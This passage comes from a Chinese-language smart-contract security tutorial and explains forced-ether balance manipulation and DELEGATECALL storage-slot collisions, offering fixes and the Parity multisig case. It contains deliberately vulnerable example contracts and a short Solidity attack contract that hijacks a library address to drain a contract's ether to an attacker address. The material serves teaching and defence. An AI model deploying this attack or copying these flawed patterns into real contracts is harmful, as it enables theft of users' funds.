punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> mileStone1Reward<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>currentBalance <span class="token operator">==</span> payoutMileStone2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            redeemableEther<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> mileStone2Reward<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>currentBalance <span class="token operator">==</span> finalMileStone <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            redeemableEther<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> finalReward<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">claimReward</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// ensure the game is complete</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>balance <span class="token operator">==</span> finalMileStone<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// ensure there is a reward to give</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>redeemableEther<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">uint</span> transferValue <span class="token operator">=</span> redeemableEther<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">;</span>        redeemableEther<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>transferValue<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>该合约代表一个简单的游戏（自然会涉及竞赛条件），其中玩家向合约发送 0.5 以太币，希望成为首先达到三个里程碑之一的玩家。里程碑以以太币计价。当游戏结束时，第一个达到里程碑的人可能会获得一部分以太币。当达到最后一个里程碑（10 以太币）时，游戏结束；然后用户可以领取他们的奖励。</p><p><code>EtherGame</code> 合约的问题来自于第 14 行（以及第 16 行和第 32 行）对 <code>this.balance</code> 的使用不当。一个恶作剧的攻击者可以通过 <code>selfdestruct</code> 函数强行发送少量的以太币，比如 0.1 以太币（前面讨论过）以防止任何未来的玩家达到里程碑。由于这 0.1 以太币的贡献，<code>this.balance</code> 永远不会是 0.5 以太币的倍数，因为所有合法玩家只能发送 0.5 以太币增量。这可以防止第 18、21 和 24 行的所有 if 条件为真。</p><p>更糟糕的是，错过里程碑的报复性攻击者可以强行发送 10 个以太币（或等量的以太币，将合约的余额推高到 <code>finalMileStone</code> 之上），这将永远锁定合约中的所有奖励。这是因为由于第 32 行的要求，<code>claimReward</code> 函数将始终revert（即，因为 <code>this.balance</code> 大于 <code>finalMileStone</code>）。</p><h3 id="预防技术-2"><a href="#预防技术-2" class="headerlink" title="预防技术"></a>预防技术</h3><p>这种漏洞通常源于对 <code>this.balance</code> 的滥用。<strong>合约逻辑应尽可能避免依赖合约余额的确切值，因为它可以被人为操纵。</strong>如果应用基于 <code>this.balance</code> 的逻辑，您必须应对意外的余额。</p><p>如果需要存入的以太币的准确值，则应使用在payable函数中递增的自定义变量，以安全地跟踪存入的以太币。这个变量不会受到通过 <code>selfdestruct</code> 调用发送的强制以太币的影响。</p><p>考虑到这一点，<code>EtherGame</code> 合约的修正版本可能如下所示：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">EtherGame</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> payoutMileStone1 <span class="token operator">=</span> <span class="token number">3</span> ether<span class="token punctuation">;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> mileStone1Reward <span class="token operator">=</span> <span class="token number">2</span> ether<span class="token punctuation">;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> payoutMileStone2 <span class="token operator">=</span> <span class="token number">5</span> ether<span class="token punctuation">;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> mileStone2Reward <span class="token operator">=</span> <span class="token number">3</span> ether<span class="token punctuation">;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> finalMileStone <span class="token operator">=</span> <span class="token number">10</span> ether<span class="token punctuation">;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> finalReward <span class="token operator">=</span> <span class="token number">5</span> ether<span class="token punctuation">;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> depositedWei<span class="token punctuation">;</span>    <span class="token keyword">mapping</span> <span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> redeemableEther<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">==</span> <span class="token number">0.5</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">uint</span> currentBalance <span class="token operator">=</span> depositedWei <span class="token operator">+</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>        <span class="token comment">// ensure no players after the game has finished</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>currentBalance <span class="token operator">&lt;=</span> finalMileStone<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>currentBalance <span class="token operator">==</span> payoutMileStone1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            redeemableEther<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> mileStone1Reward<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>currentBalance <span class="token operator">==</span> payoutMileStone2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            redeemableEther<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> mileStone2Reward<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>currentBalance <span class="token operator">==</span> finalMileStone <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            redeemableEther<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> finalReward<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        depositedWei <span class="token operator">+=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">claimReward</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// ensure the game is complete</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>depositedWei <span class="token operator">==</span> finalMileStone<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// ensure there is a reward to give</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>redeemableEther<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">uint</span> transferValue <span class="token operator">=</span> redeemableEther<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">;</span>        redeemableEther<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>transferValue<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>在这里，我们创建了一个新变量，<code>depositedWei</code>，它跟踪已知的以太坊存款，我们将这个变量用于我们的测试。请注意，我们不再引用 <code>this.balance</code>。</p><h3 id="进一步的例子"><a href="#进一步的例子" class="headerlink" title="进一步的例子"></a>进一步的例子</h3><p><a href="https://github.com/Arachnid/uscc/tree/master/submissions-2017/">Underhanded Solidity Coding Contest</a> 中给出了一些可利用合约的示例，还提供了本节中提出的许多陷阱的扩展示例。</p><h2 id="DELEGATECALL"><a href="#DELEGATECALL" class="headerlink" title="DELEGATECALL"></a>DELEGATECALL</h2><p><code>CALL</code> 和 <code>DELEGATECALL</code> 操作码在允许以太坊开发人员模块化他们的代码方面很有用。对合约的标准外部消息调用由 <code>CALL</code> 操作码处理，代码在外部合约&#x2F;函数的上下文中运行。 <code>DELEGATECALL</code> 操作码几乎相同，只是在目标地址执行的代码是在调用合约的上下文中运行的，并且 <code>msg.sender</code> 和 <code>msg.value</code> 保持不变。<strong>此特性支持库(libraries)的实现，允许开发人员一次性部署可重用代码并从未来的合约中调用它。</strong></p><p>尽管这两个操作码之间的区别简单直观，但使用 <code>DELEGATECALL</code> 可能会导致意外的代码执行。</p><p>如需进一步阅读，请参阅 Loi.Luu 关于此主题的 <a href="https://ethereum.stackexchange.com/questions/3667/difference-between-call-callcode-and-delegatecall">Ethereum Stack Exchange</a> 问题和 <a href="https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries">Solidity 文档</a>。</p><h3 id="漏洞-3"><a href="#漏洞-3" class="headerlink" title="漏洞"></a>漏洞</h3><p>由于 <code>DELEGATECALL</code> 的上下文保留特性，构建无漏洞的自定义库并不像人们想象的那么容易。库本身的代码可以是安全且无漏洞的；但是，当在另一个应用程序的上下文中运行时，可能会出现新的漏洞。让我们看一个相当复杂的例子，使用斐波那契数。</p><p>考虑 FibonacciLib.sol 中的库，它可以生成 Fibonacci 序列和类似形式的序列。 （注意：此代码是从 <a href="https://github.com/web3j/web3j/blob/master/codegen/src/test/resources/solidity/fibonacci/Fibonacci.sol">web3j&#x2F;Fibonacci.sol</a> 修改的。）</p><p>示例6. FibonacciLib.sol</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// library contract - calculates Fibonacci-like numbers</span><span class="token keyword">contract</span> <span class="token class-name">FibonacciLib</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// initializing the standard Fibonacci sequence</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> start<span class="token punctuation">;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> calculatedFibNumber<span class="token punctuation">;</span>    <span class="token comment">// modify the zeroth number in the sequence</span>    <span class="token keyword">function</span> <span class="token function">setStart</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _start<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        start <span class="token operator">=</span> _start<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">setFibonacci</span><span class="token punctuation">(</span><span class="token builtin">uint</span> n<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        calculatedFibNumber <span class="token operator">=</span> <span class="token function">fibonacci</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">fibonacci</span><span class="token punctuation">(</span><span class="token builtin">uint</span> n<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> start<span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> start <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token function">fibonacci</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">fibonacci</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这个库提供了一个函数，可以生成序列中的第 n 个斐波那契数。它允许用户更改序列的起始编号（<code>start</code>）并计算此新序列中的第 n 个类似斐波那契的数字。</p><p>现在让我们考虑一个使用这个库的合约，显示在 FibonacciBalance.sol 中。</p><p>示例7. FibonacciBalance.sol</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">FibonacciBalance</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> fibonacciLibrary<span class="token punctuation">;</span>    <span class="token comment">// the current Fibonacci number to withdraw</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> calculatedFibNumber<span class="token punctuation">;</span>    <span class="token comment">// the starting Fibonacci sequence number</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> start <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> withdrawalCounter<span class="token punctuation">;</span>    <span class="token comment">// the Fibonancci function selector</span>    <span class="token builtin">bytes4</span> <span class="token keyword">constant</span> fibSig <span class="token operator">=</span> <span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span><span class="token string">"setFibonacci(uint256)"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// constructor - loads the contract with ether</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _fibonacciLibrary<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        fibonacciLibrary <span class="token operator">=</span> _fibonacciLibrary<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        withdrawalCounter <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment">// calculate the Fibonacci number for the current withdrawal user-</span>        <span class="token comment">// this sets calculatedFibNumber</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>fibonacciLibrary<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>fibSig<span class="token punctuation">,</span> withdrawalCounter<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>calculatedFibNumber <span class="token operator">*</span> <span class="token number">1</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// allow users to call Fibonacci library functions</span>    <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>fibonacciLibrary<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>该合约允许参与者从合约中提取以太币，以太币数量等于参与者提现订单对应的斐波那契数；即，第一个参与者得到 1 个以太币，第二个也得到 1 个，第三个得到 2 个，第四个得到 3 个，第五个得到 5 个，依此类推（直到合约余额小于被提取的斐波那契数）。</p><p>本合约中的许多要素可能需要一些解释。首先，有一个看起来很有趣的变量 <code>fibSig</code>。这包含字符串 <code>&quot;setFibonacci(uint256)&quot;</code> 的 Keccak-256 (SHA-3) 散列的前 4 个字节。这被称为函数选择器，并被放入 <code>calldata</code> 以指定将调用智能合约的哪个函数。它在第 21 行的 <code>delegatecall</code> 函数中用于指定我们希望运行 <code>fibonacci(uint256)</code> 函数。 <code>delegatecall</code> 中的第二个参数是我们传递给函数的参数。其次，我们假设 <code>FibonacciLib</code> 库的地址在构造函数中被正确引用（<a href="https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc#external_contract_referencing">外部合约引用</a>讨论了与这种合约引用初始化相关的一些潜在漏洞）。</p><p>你能发现这个合约中的任何错误吗？如果要部署这个合约，用以太币填充它，然后调用 <code>withdraw</code>，它可能会revert。</p><p>您可能已经注意到状态变量 <code>start</code> 在库和主调用合约中都使用了。在库合约中，<code>start</code> 用于指定斐波那契数列的开始，设置为 <code>0</code>，而在调用合约中设置为 <code>3</code>。您可能还注意到 <code>FibonacciBalance</code> 合约中的 <code>fallback</code> 函数允许将所有调用传递给库合约，这允许调用库合约的 <code>setStart</code> 函数。回想一下我们保留了合约的状态，这个函数似乎允许您更改本地 <code>FibonnacciBalance</code> 合约中 <code>start</code> 变量的状态。如果是这样，这将允许一个人提取更多的以太币，因为结果计算的 <code>FibNumber</code> 取决于 <code>start</code> 变量（如库合约中所示）。实际上，<code>setStart</code> 函数不会（也不能）修改 <code>FibonacciBalance</code> 合约中的 <code>start</code> 变量。该合约的潜在漏洞比仅仅修改 <code>start</code> 变量要严重得多。</p><p>在讨论实际问题之前，让我们快速了解一下状态变量是如何实际存储在合约中的。<strong>状态或存储变量（在单个交易中持续存在的变量）在合约中引入时按顺序放入槽(slots)中。</strong>（这里有一些复杂性；请查阅 Solidity 文档以获得更透彻的理解。）</p><p>作为一个例子，让我们看一下库合约。它有两个状态变量，<code>start</code> 和 <code>computedFibNumber</code>。第一个变量 <code>start</code> 存储在合约存储的 <code>slot[0]</code>（即第一个 slot）中。第二个变量 <code>calculatedFibNumber</code> 被放置在下一个可用的存储槽 <code>slot[1]</code> 中。函数 <code>setStart</code> 接受一个输入并将 <code>start</code> 设置为输入的任何内容。因此，此函数将 <code>slot[0]</code> 设置为我们在 <code>setStart</code> 函数中提供的任何输入。类似地，<code>setFibonacci</code> 函数将计算的 <code>FibNumber</code> 设置为 <code>fibonacci(n)</code> 的结果。同样，这只是将 storage <code>slot[1]</code> 设置为 <code>fibonacci(n)</code> 的值。</p><p>现在让我们看看 <code>FibonacciBalance</code> 合约。存储 <code>slot[0]</code> 现在对应 <code>fibonacciLibrary</code> 地址，<code>slot[1]</code> 对应计算的 <code>FibNumber</code>。<strong>漏洞正是在这个不正确的映射中发生的。</strong> <strong>delegatecall 保留合约上下文(preserves contract context)。这意味着通过 delegatecall 调用执行的代码将作用于调用合约的状态（如存储）。</strong></p><p>现在请注意，在第 21 行的 <code>withdraw</code> 中，我们执行了 <code>fibonacciLibrary.delegatecall(fibSig,withdrawalCounter)</code>。这调用了 <code>setFibonacci</code> 函数，正如我们所讨论的，它修改了存储 <code>slot[1]</code>，在我们当前的上下文中是 <code>calculatedFibNumber</code>。这是预期的（即执行后，计算的 <code>FibNumber</code> 被修改）。但是，回想一下 <code>FibonacciLib</code> 合约中的 <code>start</code> 变量位于 storage <code>slot[0]</code> 中，即当前合约中的 <code>fibonacciLibrary</code> 地址。这意味着函数 <code>fibonacci</code> 将给出意想不到的结果。这是因为它引用了 <code>start</code> (<code>slot[0]</code>)，它在当前调用上下文中是 <code>fibonacciLibrary</code> 地址（当解释为 <code>uint</code> 时，它通常会非常大）。因此，<code>withdraw</code> 函数很可能会 revert，因为它不会包含 <code>uint(fibonacciLibrary)</code> 数量的以太币，而这是 <code>calculatedFibNumber</code> 将返回的。</p><p>更糟糕的是，<code>FibonacciBalance</code> 合约允许用户通过第 26 行的 fallback 函数调用所有 <code>fibonacciLibrary</code> 函数。正如我们之前讨论的，这包括 <code>setStart</code> 函数。我们讨论过这个函数允许任何人修改或设置 storage <code>slot[0]</code>。在这种情况下，storage <code>slot[0]</code> 是 <code>fibonacciLibrary</code> 地址。因此，攻击者可以创建恶意合约，将地址转换为 <code>uint</code>（这可以在 Python 中使用 <code>int(&#39;&lt;address&gt;&#39;,16)</code> 轻松完成），然后调用 <code>setStart(&lt;attack_contract_address_as_uint&gt;)</code>。这会将 <code>fibonacciLibrary</code> 更改为攻击合约的地址。然后，每当用户调用 <code>withdraw</code> 或 fallback 函数时，恶意合约就会运行（这会窃取合约的全部余额），因为我们已经修改了 <code>fibonacciLibrary</code> 的实际地址。这种攻击合约的一个例子是：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">Attack</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint</span> storageSlot0<span class="token punctuation">;</span> <span class="token comment">// corresponds to fibonacciLibrary</span>    <span class="token builtin">uint</span> storageSlot1<span class="token punctuation">;</span> <span class="token comment">// corresponds to calculatedFibNumber</span>    <span class="token comment">// fallback - this will run if a specified function is not found</span>    <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        storageSlot1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// we set calculatedFibNumber to 0, so if withdraw</span>        <span class="token comment">// is called we don't send out any ether</span>        <span class="token operator">&lt;</span>attacker_address<span class="token operator">></span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// we take all the ether</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>请注意，此攻击合约通过更改 storage <code>slot[1]</code> 来修改 <code>calculatedFibNumber</code>。原则上，攻击者可以修改他们选择的任何其他 storage slots，以对该合约执行各种攻击。我们鼓励您将这些合约放入 Remix 中，并通过这些 <code>delegatecall</code> 函数尝试不同的攻击合约和状态更改。</p><p>同样重要的是要注意，<strong>当我们说 delegatecall 是状态保留时，我们不是在谈论合约的变量名称，而是这些名称指向的实际 storage slot。</strong>从这个例子可以看出，一个简单的错误可能导致攻击者劫持整个合约及其以太币。</p><h3 id="预防技术-3"><a href="#预防技术-3" class="headerlink" title="预防技术"></a>预防技术</h3><p>Solidity 为实现库合约提供了 <code>library</code> 关键字（有关详细信息，请参阅<a href="https://docs.soliditylang.org/en/latest/contracts.html?highlight=library#libraries">文档</a>）。<strong>这确保了库合约是无状态且不可自毁的。强制库无状态可以减轻本节中展示的存储上下文的复杂性。无状态库还可以防止攻击者直接修改库的状态以影响依赖于库代码的合约。</strong>作为一般经验法则，在使用 <code>DELEGATECALL</code> 时，<strong>请仔细注意库合约和调用合约的可能的调用上下文，并尽可能构建无状态库。</strong></p><h3 id="真实世界的例子：Parity-Multisig-Wallet-Second-Hack"><a href="#真实世界的例子：Parity-Multisig-Wallet-Second-Hack" class="headerlink" title="真实世界的例子：Parity Multisig Wallet (Second Hack)"></a>真实世界的例子：Parity Multisig Wallet (Second Hack)</h3><p>Second Parity Multisig Wallet hack 是一个例子，来说明如果在其预期上下文之外运行编写良好的库代码可以被利用。对于这种攻击有很多很好的解释，例如“<a href="https://medium.com/chain-cloud-company-blog/parity-multisig-hack-again-b46771eaa838">Parity Multisig Hacked. Again</a>”和“<a href="https://hackingdistributed.com/2017/07/22/deep-dive-parity-bug/">深入了解 Parity Multisig Bug</a>”。</p><p>为了增加这些参考资料，让我们探索被利用的合约。库和钱包合约可以在 <a href="https://github.com/openethereum/parity-ethereum/blob/b640df8fbb964da7538eef268dffc125b081a82f/js/src/contracts/snippets/enhanced-wallet.sol">GitHub</a>(Parity已被弃用) 上找到。</p><p>库合约如下：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">WalletLibrary</span> <span class="token keyword">is</span> WalletEvents <span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token comment">// throw unless the contract is not yet initialized.</span>  <span class="token keyword">modifier</span> only_uninitialized <span class="token punctuation">&#123;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>m_numOwners <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">throw</span><span class="token punctuation">;</span> <span class="token keyword">_</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>  <span class="token comment">// constructor - just pass on the owner array to multiowned and</span>  <span class="token comment">// the limit to daylimit</span>  <span class="token keyword">function</span> <span class="token function">initWallet</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">[</span><span class="token punctuation">]</span> _owners<span class="token punctuation">,</span> <span class="token builtin">uint</span> _required<span class="token punctuation">,</span> <span class="token builtin">uint</span> _daylimit<span class="token punctuation">)</span>      only_uninitialized <span class="token punctuation">&#123;</span>    <span class="token function">initDaylimit</span><span class="token punctuation">(</span>_daylimit<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">initMultiowned</span><span class="token punctuation">(</span>_owners<span class="token punctuation">,</span> _required<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// kills the contract sending everything to `_to`.</span>  <span class="token keyword">function</span> <span class="token function">kill</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">)</span> <span class="token function">onlymanyowners</span><span class="token punctuation">(</span><span class="token function">sha3</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">suicide</span><span class="token punctuation">(</span>_to<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>钱包合约：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">Wallet</span> <span class="token keyword">is</span> WalletEvents <span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token comment">// METHODS</span>  <span class="token comment">// gets called when no other function matches</span>  <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// just being sent some cash?</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>      <span class="token function">Deposit</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span 